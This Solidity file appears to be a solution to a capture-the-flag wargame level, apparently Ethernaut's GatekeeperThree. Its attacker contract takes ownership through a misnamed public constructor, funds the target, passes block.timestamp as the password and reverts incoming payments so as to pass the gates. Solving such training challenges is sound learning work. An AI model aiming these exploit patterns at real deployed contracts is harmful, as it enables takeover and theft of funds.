pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
    function enter() external;
    function trick() external returns (address);
}

contract AttackerPayable {
    IGatekeeperThree public instance;

    constructor(address _instance) {
        instance = IGatekeeperThree(_instance);
    }

    function attack() public payable {
        instance.construct0r();
        (bool sent, ) = payable(address(instance)).call{value: 2000000000000000000}('');
        require(sent, "Send ETH failed");
        instance.createTrick();
        uint256 password = block.timestamp;
        instance.getAllowance(password);
        instance.enter();
    }

    receive() external payable {
        revert("Cannot receive");
    }
}